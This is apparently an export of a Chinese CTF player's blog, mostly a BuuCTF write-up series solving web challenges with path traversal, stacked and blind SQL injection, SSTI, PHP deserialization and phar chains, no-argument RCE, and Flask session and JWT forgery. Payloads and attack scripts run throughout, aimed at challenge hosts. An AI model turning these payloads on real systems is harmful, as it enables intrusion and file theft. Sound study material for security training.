{"pages":[{"title":"cjM00N","text":"关于我华工大三信安专业在读, 熟练使用&lt;C-c&gt; &lt;C-v&gt;编程 常用ID cjM00N or 月亮 目前为Kap0k战队Web手, NS玩家 , 吉他初学者 以及单身 联系方式Email: ​Y2ptMDBuQHFxLmNvbQ==","link":"/about/index.html"}],"posts":[{"title":"BuuCTF刷题记录","text":"感谢glzjin师傅 [HCTF 2018]WarmUp这是CISCN2019华南赛区半决赛的题目…当时没做出来 太菜了 题目源自 CVE-2018-12613 源码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; if (! isset($page) || !is_string($page)) &#123; echo \"you can't see it\"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo \"you can't see it\"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; &#125; ?&gt; 这里可以看到, 有is_string的判断, 数组绕过是不可行的, 只能绕过checkFile, 而checkFile里面有二次urldecode, 这给我们提供了机会, 如果我传一个 1?file=source.php%253f 其中%253f是?的二次编码, 这样既可绕过前面的检测, 那么接下来就是使用目录穿越了 先访问hint.php, 可以看到 1flag not here, and flag in ffffllllaaaagggg 这里有个知识点是, 当二重编码时, 这里的source.php相当于一个目录, 也就是说我们位于 12location: /var/www/html/source.php/flag: /ffffllllaaaagggg 所以4次目录穿越, payload如下 1?file=source.php%253f/../../../../ffffllllaaaagggg 或者不用判断多少直接多来几个/../也可以 最终payload 1?file=source.php%253f/../../../../ffffllllaaaagggg [强网杯 2019]随便注解题一fuzz之后发现过滤了select 上网找找有没有能绕过select的方法, 查到了堆叠过滤, 简单测一下, 我们先输入一个复合语句 11&apos;;show tables; 可以看到输出正常, 说明后端的实现应该是 1mysqli_multi_query($sql); 而平时的实现是mysql_query这样的语句可以支持多条sql语句同时执行, 那要绕过select的过滤的话可以使用 1set @t=0x68616861686168;prepare x from @t;execute x; 预编译语句来执行, 其中@t的部分是执行语句的hex编码, 例如我们要执行 1select * from `1919810931114514`; hex编码后替换上面的aaaaa即可 解题二这里其实已经有了一个select, 那我们如果利用这个来查询的话就可以直接查询flag了 先查看一下两个表的结构, 表名我们前面已经查出来了 11&apos;;show columns from words; 有两个列, 一个是id另一个是data, 明显id就是查询的索引, 所以先重命名两个表 1RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;# 可以给表增加一个id列或者直接将flag列改成id列, 然后万能密码 11&apos; or 1=1# 查出flag GetFlag最终payload如下 11&apos;;Set @t=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;Prepare x from @t; Execute x; [强网杯 2019]高明的黑客强网杯的题目, 拉下来有3001个混淆过的php, 随便打开后可以看到有输出 回来看一下源码, 可以看到有许多get或者post的参数, 并且有eval, system, assert等系统函数, 但是大部分都赋值或者无法使用 当时比赛的时候还傻乎乎的用phpstorm去一行行跟过, 这题主要考察的是fuzz的想法, 通过对这些文件进行fuzz来查找可以使用的参数, 首先需要启动php服务, 在win下我们使用phpstudy直接开就可以了, linux下直接 1php -S 0:8080 即可访问, 然后是通过正则去匹配传入的参数名 1(?&lt;=_GET\\[\\&apos;).*(?=\\&apos;\\]) # POST同理 这里不能写成 1(?&lt;=_(GET|POST)\\[\\&apos;).*(?=\\&apos;\\]) 否则会报错 查找一下, 网上的说法是 1Python lookbehinds really need to be fixed-width 也就是不能存在不确定宽度的内容, 所以我们需要将post和get分开, 这里有个技巧就是先收集所有的post和get参数同时发送, 如果在内容中检查到我们需要的信息, 再对当前文件的参数进行逐个fuzz, 这样可以节约很多http的开销, 单线程脚本如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344import requestsimport osimport refrom arrow import nowurl = \"http://localhost/src/\"work_dir = \"C:\\phpStudy\\PHPTutorial\\WWW\\src\\\\\"filename = os.listdir(work_dir)patternGet = re.compile(\"(?&lt;=_GET\\[\\').*(?=\\'\\])\")patternPOST = re.compile(\"(?&lt;=_POST\\[\\').*(?=\\'\\])\")print(\"[*] start fuzzing....\")print(now().format())for i in filename: try: content = open(work_dir + i, \"r\", encoding=\"utf-8\").read() param1 = patternGet.findall(content) paramGet = &#123;&#125; for j in list(set(param1)): paramGet[j] = \"echo(cjm00n);\" param2 = patternPOST.findall(content) paramPOST = &#123;&#125; for j in list(set(param2)): paramPOST[j] = \"echo(cjm00n);\" # print(\"[.] %s\" % (i)) res = requests.post(url + i, params=paramGet, data=paramPOST).text if \"cjm00n\" in res: print(\"[*] find at %s\" % (i)) for j in param1: res = requests.get(url + i, params=&#123;j:paramGet[j]&#125;).text if \"cjm00n\" in res: print(\"[*] find %s at %s\" %(j, i)) print(\"[*] time: %s\" %(now().format())) exit(0) for j in param2: res = requests.post(url + i, data=&#123;j:paramPOST[j]&#125;).text if \"cjm00n\" in res: print(\"[*] find %s at %s\" %(j, i)) print(\"[*] time: %s\" %(now().format())) exit(0) except Exception as e: print(e)print(\"[*] done\") 多线程脚本如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import osimport reimport requestsfrom arrow import nowfrom multiprocessing.pool import ThreadPoolurl = \"http://localhost/src/\"work_dir = \"C:\\phpStudy\\PHPTutorial\\WWW\\src\\\\\"patternGet = re.compile(\"(?&lt;=_GET\\[\\').*(?=\\'\\])\")patternPOST = re.compile(\"(?&lt;=_POST\\[\\').*(?=\\'\\])\")def fuzz(i): try: content = open(work_dir + i, \"r\", encoding=\"utf-8\").read() param1 = patternGet.findall(content) paramGet = &#123;&#125; for j in list(set(param1)): paramGet[j] = \"echo(cjm00n);\" param2 = patternPOST.findall(content) paramPOST = &#123;&#125; for j in list(set(param2)): paramPOST[j] = \"echo(cjm00n);\" # print(\"[.] %s\" % (i)) res = requests.post(url + i, params=paramGet, data=paramPOST).text if \"cjm00n\" in res: print(\"[*] find at %s\" % (i)) for j in param1: res = requests.get(url + i, params=&#123;j:paramGet[j]&#125;).text if \"cjm00n\" in res: print(\"[*] find %s at %s\" %(j, i)) print(\"[*] time: %s\" %(now().format())) exit(0) for j in param2: res = requests.post(url + i, data=&#123;j:paramPOST[j]&#125;).text if \"cjm00n\" in res: print(\"[*] find %s at %s\" %(j, i)) print(\"[*] time: %s\" %(now().format())) exit(0) except Exception as e: print(e)if __name__ == \"__main__\": filename = os.listdir(work_dir) print(\"[*] start fuzzing....\") print(now().format()) pool = ThreadPool(20) for i in filename: pool.apply_async(fuzz, (i, )) pool.close() pool.join() [护网杯 2018]easy_tornado打开后可以看到有3个文件, 整理一下文件的信息如下 123456/flag.txtflag in /fllllllllllllag/welcome.txtrender/hints.txtmd5(cookie_secret+md5(filename)) 同时可以观察到url 1http://8054a022-951c-4d19-bc64-c61811d345b4.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=3a8e112bdc5efa665da8d5d7df15d1e8 根据文件名和url, 我们猜测是验证filehash后, 打开了对应的文件并将内容显示到网页中, 而filehash的计算公式中还需要一个cookie_secret, 随便改一下filename, 有个错误页面 python中经常出现404页面的SSTI, 这里的msg就是可以注入的参数, 一般来说, Flask的注入可以执行很多系统命令, 但是其他的模板如Django只能获取一些系统的变量等等, 在tornado中有个很方便的对象handler, 参考 https://www.cnblogs.com/bwangel23/p/4858870.html, 它指向了RequestHandler, 可以用来获取Web Application的setting, 例如我们需要的cookie_secret一般就是在Application的setting里面, 这里使用 1error?msg=&#123;&#123;handler.settings&#125;&#125; 然后md5 1234&lt;?php $filename = \"/fllllllllllllag\"; $cookie_secret = \"a98fc479-624b-45a6-9b84-5c9b4caa2234\"; echo md5($cookie_secret.md5($filename)); 带上参数访问即可 [SUCTF 2019]Pythonginx首先看到源码 123456789101112131415161718192021@app.route('/getUrl', methods=['GET', 'POST'])def getUrl(): url = request.args.get(\"url\") host = parse.urlparse(url).hostname if host == 'suctf.cc': return \"我扌 your problem? 111\" parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return \"我扌 your problem? 222 \" + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl).read() else: return \"我扌 your problem? 333\" 需要绕过几个检测, 然后urlopen()打开, 由于要检测host, 所以不能直接打开文件, 这里有个知识点是如果用file://协议打开一个链接形式如下 1file://hostname:port/path file协议会默认从本地匹配路径, 因此上面的链接相当于 1file:///path 有了文件读取, 现在需要绕过这个检测, 这里参考blackhat的payload https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf 绕过的payload如下 1http://47.111.59.243:9000/getUrl?url=file://suctf.c%E2%84%85pt/../etc/passwd 解析后相当于 1http://47.111.59.243:9000/getUrl?url=file://suctf.cc/opt/../etc/passwd 成功读取, 当时比赛的时候找了很久都没有找到flag 然后需要找到nginx的配置文件, 参考官方手册 也就是说默认的有如下几个路径 123/usr/local/nginx/conf/nginx.conf/etc/nginx/ngin.conf/usr/local/etc/nginx/nginx.conf 分别读一下, 就能找到flag的位置 [安洵杯 2019]easy_serialize_php可以看到源码 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function = @$_GET['f'];function filter($img)&#123; $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[\"user\"] = 'guest';$_SESSION['function'] = $function;extract($_POST);if(!$function)&#123; echo '&lt;a href=\"index.php?f=highlight_file\"&gt;source_code&lt;/a&gt;';&#125;if(!$_GET['img_path'])&#123; $_SESSION['img'] = base64_encode('guest_img.png');&#125;else&#123; $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));&#125;$serialize_info = filter(serialize($_SESSION));if($function == 'highlight_file')&#123; highlight_file('index.php');&#125;else if($function == 'phpinfo')&#123; eval('phpinfo();'); //maybe you can find something in here!&#125;else if($function == 'show_image')&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img']));&#125; 再看一眼phpinfo, 可以看到有个文件, 想办法读它 审计代码的关键点在于 123extract($_POST);...$userinfo = unserialize($serialize_info); 一个是变量覆盖, 一个是反序列化而代码最后是 1echo file_get_contents(base64_decode($userinfo[&apos;img&apos;])); 回溯一下 1$userinfo &lt;- unserialize($serialize_info) &lt;- $serialize_info &lt;- filter(serialize($_SESSION)) 那我们要覆盖的就是$_SESSION, 这里有个filter, 他是在反序列化之后进行的, 而这就会出现反序列化字符串逃逸的漏洞首先了解一下 https://xz.aliyun.com/t/6718php对于反序列化的处理中, 不会对内容进行检查, 他只是单纯的根据声明的数字去找内容, 正常的反序列化字符串是这样的 1a:1:&#123;s:1:&quot;b&quot;;s:1:&quot;c&quot;;&#125; 如果我们把内容c改成这样 1a:1:&#123;s:1:&quot;b&quot;;s:4:&quot;c&quot;;&#125;&quot;;&#125; php也能够正常的反序列化, 因为c的部分声明了4的长度, 后面的4个字符都会包含在里面, 而如果出现某种情况导致4长度变成了1, 那反序列化就会结束而忽略掉最后的;}, 也就是说下面这样的字符串也可以正常的反序列化 1a:1:&#123;s:1:&quot;b&quot;;s:1:&quot;c&quot;;&#125;&quot;;&#125; 而怎么造成这样的变化呢, 代码中有一个filter函数, 他会使得_SESSION数组的键值长度变短 12345function filter($img)&#123; $filter_arr = array(&apos;php&apos;,&apos;flag&apos;,&apos;php5&apos;,&apos;php4&apos;,&apos;fl1g&apos;); $filter = &apos;/&apos;.implode(&apos;|&apos;,$filter_arr).&apos;/i&apos;; return preg_replace($filter,&apos;&apos;,$img);&#125; 如果我们让键值为imgflagflag, 就能吞掉后面8位的内容, 因为两个flag被替换成空了, 如果8个字符可以到达这个键对应的值的位置, 那我们就能够任意构造字符串了, 例如 1a:1:&#123;s:11:&quot;imgflagflag&quot;;s:45:&quot;&quot;;xxxxxxx;&#125;&quot;;&#125; 这里的串如果经过filter的话会变成 1a:1:&#123;s:11:&quot;img&quot;;s:45:&quot;&quot;;xxxxxxx;&#125;&quot;;&#125; 也就是说x前面的内容都被包括进前一个字符串了, 后面的内容就自由构造, 只要符合语法就可以了 附上生成的exp 1234567&lt;?php// what file you want to read$filename = \"/d0g3_fllllllag\";$a['img'] = base64_encode($filename);$res = substr(serialize($a), 5);$_SESSION['imgflagflag'] = '\";s:1:\"a\";'.$res;echo \"_SESSION['imgflagflag']=\".$_SESSION['imgflagflag']; [ByteCTF 2019]Boring Code题目代码很简洁, 先是在index.php里面有一句 1flag in this file and code in /code 访问code, 可以看到代码 123456789101112131415161718192021222324252627282930313233&lt;?phpfunction is_valid_url($url) &#123; if (filter_var($url, FILTER_VALIDATE_URL)) &#123; if (preg_match('/data:\\/\\//i', $url)) &#123; return false; &#125; return true; &#125; return false;&#125;if (isset($_POST['url']))&#123; $url = $_POST['url']; if (is_valid_url($url)) &#123; $r = parse_url($url); if (preg_match('/baidu\\.com$/', $r['host'])) &#123; $code = file_get_contents($url); if (';' === preg_replace('/[a-z]+\\((?R)?\\)/', NULL, $code)) &#123; if (preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) &#123; echo 'bye~'; &#125; else &#123; eval($code); &#125; &#125; &#125; else &#123; echo \"error: host not allowed\"; &#125; &#125; else &#123; echo \"error: invalid url\"; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 由于实在是绕不过去baidu.com的检测, 去买了个kapbaidu.com的域名, 花了55块钱, 很心痛 有了域名就很快乐, 可以直接读命令了, 然后要绕过正则, 是一个无参数RCE的正则, 可以参考两道之前的题目 codebreaking的phplimit rctf2018的r-cursive 读文件的payload大概如下 1readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); 但是题目把里面的大部分都过滤了, 先fuzz了一下可用函数 1234567891011&lt;?php$list = get_defined_functions()['internal'];foreach($list as $key =&gt; $code)&#123; if (preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) &#123; unset($list[$key]); &#125; if (preg_match('/[^(a-z)]/i', $code))&#123; unset($list[$key]); &#125;;&#125;var_dump($list); 研究了很久之后决定用chr() + 时间函数的组合 1readfile(end(scandir(chr(microtime(chdir(next(scandir(chr(next(each(localtime()))))))))))); 简单来说就是上面的变型, 其中 end 代替 next(array_reverse()) chr(microtime()) 和chr(next(scandir(chr(next(each(localtime())))))) 都是代替 . next(scandir() 代替 .. 但是这个太随缘, 爆了很久都没用, 最后队友@kk发了个替换.的方法 1next(each(localeconv())) 最终payload如下 1readfile(end(scandir(chr(microtime(chdir(next(scandir(next(each(localeconv())))))))))); 传到服务器上爆破即可 不过在buu上做就心酸的多了, 赵总给了个内网的靶机, 但是xshell挂上代理连不上 用proxychains也没连上 在这个师傅的博客上找到了绕过的方法 Buuoj Writeups(一) 1url=compress.zlib://data:@baidu.com/baidu.com?,payload; 然后就是随缘爆破了, 这里也说一下buu的访问频率在每秒50个请求以内, 超过就会ban ip [上海大学生赛2019]decade第五届上海大学生信息安全竞赛的题目, 这题是上一题的升级版, 不在buu上面, 顺带分析了, 先看源码 12345678910111213141516171819&lt;?phphighlight_file(__FILE__);$code = $_GET['code'];if (!empty($code)) &#123; if (';' === preg_replace('/[a-z]+\\((?R)?\\)/', NULL, $code)) &#123; if (preg_match('/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) &#123; echo 'bye~'; &#125; else &#123; eval($code); &#125; &#125; else &#123; echo \"invalid\"; &#125;&#125;else &#123; echo \"invalid\"; &#125;?&gt; 翻出之前的payload 1readfile(end(scandir(chr(microtime(chdir(next(scandir(next(each(localeconv())))))))))); 首先还是fuzz一下可用的函数 123456789101112131415&lt;?php$list = get_defined_functions()['internal'];foreach($list as $key =&gt; $code)&#123; if (preg_match('/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) &#123; unset($list[$key]); &#125; if (preg_match('/[^(a-z)]/i', $code))&#123; unset($list[$key]); &#125;;&#125;$out = fopen(\"fuzz.txt\", \"w\");foreach($list as $key)&#123; fwrite($out, $key.\"\\n\");&#125;fclose($out); 然后查找一下read相关的函数, readgzfile这个函数可以用 其他的如gzread, bzread都因为参数问题无法调用, 但是实际上file函数也是可用的, 不过file函数返回的是数组, 对于echo的话, 不能处理数组, 我们有以下的方法来进行拼接 join serialize implode 接下来就是构造46或者.了, 翻一下boring_code的相关题解, 可以看到构造的方法有这么几种 12echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))))))))))); 其实大概就是数学方法和随机(玄学)方法, 找到了网上的两种做法分别是 玄学做法 https://xz.aliyun.com/t/6737 1chr(strrev(uniqid())); ​ http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/ 1chr(ord(hebrevc(crypt(phpversion())))); 数学方法 (官方解法) 参考http://blog.sina.com.cn/s/blog_a661ecd501012xsr.html 1chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile()))))))))))); 拼接一下payload即可 123readgzfile(end(scandir(chr(strrev(uniqid(chdir(next(scandir(chr(strrev(uniqid())))))))))));readgzfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));echo(join(file(end(scandir(next(each(scandir(chr(floor(tan(tan(atan(atan(ord(cos(chdir(next(scandir(chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile())))))))))))))))))))))))))))); [HCTF 2018]admin主要参考自 https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup 登录后可以看到有源码位置, 下载来看看 https://github.com/woadsl1234/hctf_flask/ 下载后看路由routes.py, 这个很可疑的函数就是其中一个突破点 解法一 unicode欺骗关于这个函数, 可以看 [unicode 欺骗](https://panda1g1.github.io/2018/11/15/HCTF admin/) 简而言之就是 1ᴬ -&gt; A -&gt; a 那我们就可以利用这样的操作来登录admin了 注册ᴬdmin 登录``ᴬdmin, 此时变为Admin` 更改密码, 此时即为admin 用新密码登录admin即可 解法二 Session欺骗原因是泄露了SECRET_KEY, 那么我们就可以解开这个session并伪造了 使用下面这个工具即可 https://github.com/noraj/flask-session-cookie-manager 先注册我们的账号后获取cookie 1session=.eJw9kE2LwjAYhP_KkrOHJuteCh4WosWF9y0psSG5iFtr03x0oSpdI_73VVm8zjDPMHMl28PYHi3JT-O5nZFtvyf5lbx9k5wA1xfkQIEvEyaYQK48JkGRGw_Fly8VBkwhGtcwLDAYWXmQ3aRjbUFVvZYN1dJEkHpuuJi0W2bIYELXXYDvIyYbUYYeY-3veY9u84sRe802c1BiQv75DgydkdYiWyfgdTC8u5RF9cg4kEsKTNBS6QW5zUhzHA_b049vh9cEdCKhwghqFTWre-TdBG79oaWeSrWh91qrUwhQiMzwEIyrLIrFE9fHXde-SI0yQ_vvDLvYPiQXs2wgM3I-tuPzOEIzcvsDlENuLg.XkFf9Q.RLHeiZt47umzNlKn7JODZ-bQWts 解密 123python flask_session_cookie_manager3.py decode -c &apos;.eJxxxxxxxx&apos; -s &apos;ckj123&apos;Output:&quot;ckj123&quot; -t &quot;&#123;&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;06243501373011d74546d0bd9ce79ff764cee4d180bea1dba75a6f168d40b147c068207f78f59b6ed4cd6516cbce81d04073cce8a7b305ed828db6ec1153d59f&apos;, &apos;csrf_token&apos;: b&apos;6435cf1afceb480229a609e54cac9e0d4d9ef4a5&apos;, &apos;image&apos;: b&apos;qfgy&apos;, &apos;name&apos;: &apos;cjm00n&apos;, &apos;user_id&apos;: &apos;10&apos;&#125;&quot; 然后将name改为admin并加密 123python flask_session_cookie_manager3.py encode -s &apos;ckj123&apos; -t &quot;&#123;&apos;_freshxxxxxx&quot;Output:.eJw9kE1rAjEURf9KydqFSe1GcFGIDhbeGzLECclGdBwnn1MYlakR_3utFNeXcy733sj2OLQnS-bn4dJOyNYdyPxG3vZkToDrK3KgwJcZM4wgVwGzoMhNgOIrlAoj5piMbxgWGI2sAshu1Km2oCqnZUO1NAmknhkuRu2XU2Qwou-uwA8Js00oo8NUhwcf0G9-MKHTbDMDJUbkn-_A0BtpLbJ1Bl5Hw7trWVR_jAe5pMAELZVekPuENKfhuD1_h7Z_TUAvMipMoFZJs9oh70bw6w8t9ViqDX3UWp1jhEJMDY_R-MqiWDx1Lu269mVqlOnb_6TfpUdAdofkejIhl1M7PH8jdEruvyuNbi8.XkFg2w.fFLXcLQnZfAYUlnkHDMu79ar_w0 使用获得的值替换cookie即可 解法三 条件竞争这个想法很骚气, 先看下面两处代码 首先是登录处, 将session[&#39;name&#39;]赋值为我们传的值 而更改密码处是直接使用了session[&#39;name&#39;] 我们假设有进程A和B使用了同样的session A请求登录admin, 那么此时session[&#39;name&#39;]为admin 同时B请求改密码, 这时改的就是admin的密码 注意在两次操作中sessionid是会改变的 代码实现如下(这里本地搭了一下环境没搭起来, 就不去祸害buu了) 123456789101112131415161718192021222324252627282930313233343536373839404142434445import requestsimport reimport threadingurl = \"http://269dedc4-b06b-4cdf-ad18-94952755b0b0.node3.buuoj.cn/\"def login(s, username, passwd): data = &#123; \"username\": username, \"password\": passwd, &#125; return s.post(url + \"login\", data=data).textdef change(s, passwd): data = &#123; \"newpassword\": passwd &#125; return s.post(url + \"change\", data=data).textdef logout(s): return s.get(url + \"logout\")def format_flag(res): pattern = \"flag&#123;.+&#125;\" flag = re.findall(pattern, res) if flag: return flag[0] else: return Falsedef tryToChange(s): login(s, \"cjm00n\", 'cjm00n') change(s, 'cjm00n')def tryToLogin(s): logout(s) login(s, 'admin', 'cjm00n')if __name__ == \"__main__\": s = requests.Session() for i in range(1000): print(i) t1 = threading.Thread(target=tryToChange, args=(s,)) t2 = threading.Thread(target=tryToLogin, args=(s,)) t1.start() t2.start() [CISCN2019 华北赛区 Day2 Web1]Hack World先fuzz一下 可以看到有布尔的结果, 那么应该是布尔盲注, 然后再看过滤的内容, 其中482长度的为被过滤的 这里其实不太明白为什么检测的内容这么少, 回去看源码 12345678910&lt;?phpfunction safe($sql)&#123; $blackList = array(' ','||','#','-',';','&amp;','+','or','and','`','\"','insert','group','limit','update','delete','*','into','union','load_file','outfile','./'); foreach($blackList as $blackitem)&#123; if(stripos($sql,$blackitem))&#123; return False; &#125; &#125; return True;&#125; 这里用的函数是stripos, 那么就很明显了, 如果出现在第一位, 则函数结果为0, 在类型转换后就是False, 所以前期fuzz就不顺利了hhh 重新fuzz结果 然后就构造一下盲注的payload, 这里可以用 1if(ascii(substr((select(flag)from(flag)),1,1))&gt;1,1,0) 或者使用异或也可以 11^(ascii(substr((select(flag)from(flag)),1,1))&gt;1) 写个脚本跑一下 12345678910111213141516171819202122232425262728293031import requestsfrom time import sleepurl = \"http://1d7350ba-68f1-47e8-b269-3381908ddae5.node3.buuoj.cn/index.php\"def attack(cur, mid): payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d,1,0)\" % (cur, mid) res = requests.post(url, data=&#123;\"id\":payload&#125;).text if \"glzjin\" in res: return True else: return Falsedef main(): flag = \"\" for i in range(1, 43): end = 127 start = 1 mid = (end + start) // 2 while end &gt; start: if attack(i, mid): start = mid + 1 else: end = mid mid = (end + start) // 2 sleep(0.3) flag += chr(mid) print(flag)if __name__ == \"__main__\": main() [网鼎杯 2018]Fakebook一开始以为是二次注入, 不过发现他点击用户名之后, 有个请求页面的功能, 同时观察到url有个no=1 这里一定有请求数据库, 那么先注入一下, 发现没有什么过滤, 回显在第二列,依次注入后, 发现data中是一个反序列化字符串 1230%20union/**/select%201,(select%20group_concat(data)%20from%20users),3,4%23Output:O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;cjm00n&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:10:&quot;cjm00n.top&quot;;&#125; 我们再观察一下, 他有个robots.txt, 内容如下 12User-agent: *Disallow: /user.php.bak 访问后可以看到一部分源码 这里可以看到有个curl, 那么试试file协议 在注入中将结果更改为file:///var/www/html/flag.php 一开始没找到, 看wp中是在这个位置 payload如下 10%20union/**/select%201,(select%20group_concat(data)%20from%20users),3,&apos;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;cjm00n&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&apos;%23 然后base64解开即可 [GXYCTF2019]BabySQli直接上payload吧 1name=1&apos;union select 1,&apos;admin&apos;,&apos;e10adc3949ba59abbe56e057f20f883e&apos;%23&amp;pw=123456 其中e10adc3949ba59abbe56e057f20f883e=MD5(123456) [CISCN2019 华北赛区 Day1 Web1]Dropbox首先点进去, 随便注册个账号, 发现有文件上传功能, 先上传一个试试, 看一下下载的功能 123456789101112131415161718192021222324252627282930function download() &#123; var filename = $(this).parent().attr(\"filename\"); var form = $('&lt;form method=\"POST\" target=\"_blank\"&gt;&lt;/form&gt;'); form.attr('action', 'download.php'); var input = $('&lt;input type=\"hidden\" name=\"filename\" value=\"' + filename + '\"&gt;&lt;/input&gt;') $(document.body).append(form); $(form).append(input); form.submit(); form.remove();&#125;function deletefile() &#123; var filename = $(this).parent().attr(\"filename\"); var data = &#123; \"filename\": filename &#125;; $.ajax(&#123; url: 'delete.php', type: 'POST', data: data, success: function (json) &#123; if (json['success']) &#123; toast('删除成功', 'info'); &#125; else &#123; toast(json['error'], 'danger'); &#125; setTimeout(function () &#123;location.reload();&#125;, 1000); &#125; &#125;);&#125; 试试能不能任意文件下载, 证明是可以的, 不过需要用绝对路径, 默认的路径不在html下面 然后就是审计了, 可以看到有个神奇的close() 这个应该就是获取flag的地方了, 那找一下调用的部分 这里有个调用点, 结合文件上传, 应该是phar反序列化, 那是不是直接用 1User -&gt; __destruct() -&gt; File -&gt; close() 这条调用链呢, 答案是不行的, 如果这样的话是可以实现读取, 但是不能够输出, 所以需要借助第三个类 这个类有两个主要的方法 __call(): 用于实现函数调用, 对于自身没有的函数会调用$file-&gt;$func() __destruct(): 用于输出 那么调用链就可以实现了 1User -&gt; __destruct() -&gt; Filelist -&gt; close()[不存在] -&gt; __call() -&gt; File -&gt; close() 然后使用phar生成的exp如下 12345678910111213141516171819202122232425262728293031323334&lt;?phpclass File &#123; public $filename; public function __construct($filename) &#123; $this-&gt;filename = $filename; &#125;&#125;class User &#123; public $db;&#125;class FileList &#123; private $files; private $results; private $funcs; public function __construct() &#123; $file = new File(\"/flag.txt\"); $this-&gt;files = array($file); $this-&gt;results = array(); $this-&gt;funcs = array(); &#125;&#125;$user = new User();$user-&gt;db = new FileList();$filename = \"dropbox.phar\";file_exists($filename) ? unlink($filename) : null;$phar=new Phar($filename);$phar-&gt;startBuffering();$phar-&gt;setStub(\"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;\");$phar-&gt;setMetadata($user);$phar-&gt;addFromString(\"foo.txt\",\"bar\");$phar-&gt;stopBuffering();?&gt; 随手写了个py脚本进行自动化上传 123456789101112131415161718192021222324252627282930313233343536373839404142434445import requestsimport reimport osurl = \"http://dad30c9a-7a47-42a6-a844-5dd18599a35b.node3.buuoj.cn/\"session = requests.Session()def generate(): command = \"php ./exp.php\" os.system(command)def login(): data = &#123; \"username\": \"cjm00n\", \"password\": \"cjm00n\" &#125; session.post(url + \"login.php\", data=data)def upload(): file = open(\"dropbox.phar\", \"rb\") files = &#123; 'file': ('dropbox.gif', file, \"image/gif\") &#125; session.post(url + \"upload.php\", files=files)def delete(): res = session.post(url + \"delete.php\", data=&#123;\"filename\": \"phar://dropbox.gif\"&#125;).text # get flag print(re.findall(\"flag&#123;.+&#125;\", res)[0])def main(): generate() login() upload() delete()if __name__ == \"__main__\": main() [CISCN2019 华北赛区 Day1 Web2]ikun这题蛮有意思的 首先看一下页面 发现有个提示, 翻了几页没有看到lv6的, 测了一下发现页数还是挺多的, 可以到200 写个脚本跑一下 1234567891011import requestsfrom time import sleepurl = \"http://8d13affc-8a20-4111-a664-73e47683080d.node3.buuoj.cn/shop?page=\"for i in range(200): res = requests.get(url + str(i)).text if \"lv6.png\" in res: print(i) break sleep(0.1) 结果在181页, 但是价格巨大, 在post参数中发现有price和discount, 改一个很小(大?)的折扣 然后就可以顺利买到了, 然后提示一个新的页面b1g_m4mber 这里不是XFF那些操作, 而是通过改jwt参数来伪造, 有点像前面的[HCTF 2018]admin 在 https://jwt.io/ 查询一下当前的jwt 但是改jwt前需要获取key, 使用 c-jwt-cracker 爆破一下 顺利伪造 在页面的注释找到了源码的位置 审计, 发现有个pickle反序列化 参考 https://blog.csdn.net/qq_26406447/article/details/91964502, 